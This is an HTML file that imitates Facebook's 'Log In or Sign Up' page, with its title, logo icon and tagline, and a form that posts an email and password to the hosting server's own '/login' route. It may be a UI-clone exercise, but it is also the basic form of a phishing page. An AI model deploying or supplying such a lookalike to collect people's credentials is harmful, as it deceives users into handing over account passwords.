<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <link rel="stylesheet" href="/static/stylelogin.css">
  <link rel="shortcut icon" href="/static/logo/Facebook_Logo.ico" type="image/x-icon">
</head>
<body>
  <div class="container">
    <!-- Left text -->
    <div class="text-section">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share with the people in your life.</p>
    </div>

    <!-- Right login form -->
    <div class="form-section">
      <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Email address or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log in</button>
        <a href="#">Forgotten password?</a>
        <div class="divider"></div>
        <button type="button" class="create-btn" onclick="window.location.href='/register'">
          Create new account
        </button>
      </form>
    </div>
  </div>

  <div class="bottom-text">
    <a href="#">Create a Page</a> for a celebrity, brand or business.
  </div>
</body>
</html>
